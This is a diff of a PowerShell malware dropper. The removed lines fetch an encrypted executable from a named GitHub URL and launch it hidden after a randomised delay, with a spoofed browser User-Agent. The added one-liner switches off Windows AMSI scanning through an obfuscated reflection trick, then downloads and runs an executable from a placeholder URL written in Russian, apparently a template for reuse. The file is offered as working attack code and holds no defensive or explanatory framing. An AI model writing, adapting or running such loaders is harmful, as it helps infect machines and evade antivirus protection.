@@ -1,8 +1,1 @@
-$p = "$env:TEMP\crypted_powershell.exe"
-try {
-  $wc = New-Object Net.WebClient
-  $wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
-  $wc.DownloadFile('https://github.com/matvejsklarov9-cyber/my/raw/refs/heads/main/crypted_powershell.exe', $p)
-} catch {}
-Start-Sleep -m (Get-Random -Min 400 -Max 1200)
-if (Test-Path $p) { Start-Process $p -WindowStyle Hidden }
+$f=[String]::new([char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100));[Ref].Assembly.GetType('System.Management.Automation.'+'AmsiUtils').GetField($f,'NonPublic,Static').SetValue($null,$true);$p="$env:TEMP\update.exe";(New-Object Net.WebClient).DownloadFile('https://ТВОЙ-УРЛ/ФАЙЛ.exe',$p);Start-Process $p
